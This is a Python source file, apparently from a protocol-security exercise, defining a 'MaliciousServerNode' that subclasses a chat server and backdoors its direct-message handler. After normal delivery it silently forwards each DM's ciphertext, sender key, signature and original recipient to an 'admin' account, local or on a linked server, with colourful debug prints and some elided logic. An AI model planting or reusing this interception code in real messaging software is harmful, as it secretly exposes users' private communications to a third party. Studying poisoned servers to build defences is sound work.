# src/pki_primitives/malicious_server.py

import logging

# ============================ IMPORTS FROM THE MAIN PROJECT ============================
from socp.server import ServerNode as OriginalServerNode
from socp.server import ServerConfig
from socp.protocol import Envelope, EnvelopeType
# ===================================================================================

logger = logging.getLogger(__name__)


class MaliciousServerNode(OriginalServerNode):
    """
    A poisoned version of the ServerNode with extensive debugging prints
    to diagnose the silent backdoor.
    """

    def __init__(self, config: ServerConfig) -> None:
        super().__init__(config)
        print("\n\033[91m[!!!] MALICIOUS ServerNode Initialized! DM interception is active.\033[0m\n")


    async def _handle_msg_direct(self, envelope: Envelope) -> None:
        """
        This is our backdoored message handler with added debug prints.
        """
        # --- Step 1: Execute the original, legitimate logic first ---
        await super()._handle_msg_direct(envelope)

        # --- Step 2: Now, execute our malicious forwarding logic with diagnostics ---
        print("\033[95m--- [BACKDOOR DEBUG] ---")
        try:
            backdoor_recipient_id = "admin"
            sender = envelope.from_id
            recipient = envelope.to

            print(f"[BACKDOOR] Intercepting DM from '{sender}' to '{recipient}'.")
            
            # Avoid self-interception
            if sender == backdoor_recipient_id or recipient == backdoor_recipient_id:
                print("[BACKDOOR] Message involves admin, skipping forward to avoid loop.")
                print("--- [END BACKDOOR DEBUG] ---\033[0m")
                return

            # THE MOST IMPORTANT CHECK: Where is the admin user located?
            backdoor_target_server = self.user_locations.get(backdoor_recipient_id)
            print(f"[BACKDOOR] Checking for '{backdoor_recipient_id}'. Location found: {backdoor_target_server}")

            # Did we find the admin user at all?
            if not backdoor_target_server:
                print(f"\033[93m[BACKDOOR WARNING] '{backdoor_recipient_id}' is not online or not known to this server.\033[0m")
                print("--- [END BACKDOOR DEBUG] ---\033[0m")
                return

            # We found the admin. Now, how do we send the message?
            # This logic is now more robust to handle both local and remote admins.

            # Scenario A: The admin is connected to a DIFFERENT server
            if backdoor_target_server in self.server_links:
                print(f"[BACKDOOR] Admin is on remote server '{backdoor_target_server}'. Checking link...")
                # ... (rest of the remote logic) ...
                
                print(f"\033[92m[BACKDOOR SUCCESS] Conditions met! Forwarding to remote server '{backdoor_target_server}'.\033[0m")
                
                # ... [This is the same remote-forwarding logic as before] ...
                backdoor_payload = { "user_id": backdoor_recipient_id, "ciphertext": envelope.payload.get("ciphertext"), "sender": sender, "sender_pub": envelope.payload.get("sender_pub"), "content_sig": envelope.payload.get("content_sig"), "original_recipient": recipient }
                backdoor_envelope = self._build_envelope(EnvelopeType.SERVER_DELIVER, to=backdoor_target_server, payload=backdoor_payload, ts=envelope.ts)
                await self.server_links[backdoor_target_server].send(backdoor_envelope.to_json())

            # Scenario B: The admin is connected to THIS server
            elif backdoor_target_server == "local":
                print(f"[BACKDOOR] Admin is connected locally. Checking local user link...")
                admin_link = self.local_users.get(backdoor_recipient_id)
                if admin_link:
                    print(f"\032[92m[BACKDOOR SUCCESS] Conditions met! Delivering to local admin.\033[0m")
                    
                    # We send a USER_DELIVER frame, just like a normal message.
                    backdoor_payload = { "ciphertext": envelope.payload.get("ciphertext"), "sender": sender, "sender_pub": envelope.payload.get("sender_pub"), "content_sig": envelope.payload.get("content_sig"), "original_recipient": recipient }
                    backdoor_envelope = self._build_envelope(EnvelopeType.USER_DELIVER, to=backdoor_recipient_id, payload=backdoor_payload, ts=envelope.ts)
                    await admin_link.send(backdoor_envelope.to_json())
                else:
                    print(f"\033[91m[BACKDOOR ERROR] Admin location is 'local' but no websocket link found in local_users!\033[0m")

            else:
                print(f"\033[91m[BACKDOOR ERROR] Admin found at '{backdoor_target_server}', but it's not 'local' and not in server_links!\033[0m")

        except Exception as e:
            logger.error(f"[BACKDOOR] CRITICAL FAILURE in forwarding logic: {e}", exc_info=True)
        
        finally:
            print("--- [END BACKDOOR DEBUG] ---\033[0m")